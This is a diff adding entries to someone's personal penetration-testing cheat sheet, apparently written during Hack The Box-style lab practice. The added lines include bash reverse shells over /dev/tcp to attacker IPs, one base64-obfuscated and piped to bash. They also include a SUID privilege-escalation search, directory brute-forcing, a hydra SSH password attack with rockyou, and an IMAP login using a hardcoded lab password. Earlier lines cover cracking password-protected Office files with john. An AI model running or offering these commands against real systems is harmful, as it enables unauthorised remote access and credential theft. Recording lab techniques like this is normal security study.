@@ -102,6 +102,10 @@ route alternative ip r
 last [to display last login details]
 stat a.txt [To know the state of directory or file]
 
+Checking File Type and Attributes
+file filename.txt
+lsattr filename.txt
+
 swap space = virtual memory where we used hard drive space as a RAM
 
 05/30/2024
@@ -441,3 +445,24 @@ Note in case it failed and says service not running so enable ssh in system [ su
 crack doc or any office file with password protected, we can use office2john to get hashes from file and then use for cracking
 office2john file.doc > file.hashes
 john file.hash --wordlist=/usr/share/wordlists/rockyou.txt --rule
+
+08/02/2026
+gobuster dir -u http://enigma.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+showmount -e 10.129.76.199 [ Check wher NFS service is running on what port]
+
+reverse shell
+bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
+find / -perm -4000 -type f 2>/dev/null
+
+bash -i >& /dev/tcp/10.10.17.192/5555 0>&1 [convert to base64 = YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xOTIvNTU1NSAwPiYx ]
+
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xOTIvNTU1NSAwPiYx' | base64 -d | bash
+curl --insecure -u 'sarah:Enigma2024!' "imaps://10.129.77.207/" -X "EXAMINE INBOX" [ read or fetch data from mailbox]
+ps aux | grep -v "\]$" [ check services running with what access]
+
+08/04/2026
+cat /etc/group [ checking user in what group or vice versa]
+groups username [to check user is part of what group]
+
+08/16/2026
+└─$ hydra -l thomas -P /usr/share/wordlists/rockyou.txt ssh://10.129.89.207 -V [ hydra to attack on ssh ]
